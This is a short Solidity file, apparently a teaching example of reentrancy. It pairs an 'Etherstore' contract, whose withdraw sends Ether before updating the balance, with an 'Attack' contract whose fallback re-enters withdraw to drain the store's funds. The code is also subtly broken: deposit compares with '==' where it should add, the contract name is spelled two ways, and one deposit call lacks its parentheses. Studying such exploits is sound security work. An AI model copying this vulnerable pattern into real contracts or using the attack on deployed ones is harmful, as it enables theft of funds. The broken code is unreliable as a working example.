// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Etherstore{
    mapping(address=> uint) public balances;

    function deposit () public payable{
        balances [msg.sender]==msg.value;
    }
    function withdraw (uint _amount) public {
        require  (balances[msg.sender]>= _amount);
        (bool sent, ) = msg.sender .call {value: _amount} ("");
        require (sent, "Failed to send Ether");
        balances[msg.sender] -=_amount;
    }
    function getbalance() public view returns (uint) {
        return address (this).balance;
    }
}

contract Attack{
    EtherStore public etherStore;
    constructor (address _etherStoreAddress) public{
        etherStore = EtherStore(_etherStoreAddress);
    }
    fallback() external payable 
    {
        if (address(etherStore).balance >= 1 ether)
    { etherStore.withdraw(1 ether);}
    }

    function attack () external payable{
        require (msg.value >= 1 ether);
        etherStore.deposit {value: 1 ether};
        etherStore.withdraw( 1 ether);
    }

    function getbalance () public view returns (uint){
        return address(this).balance;
    }
}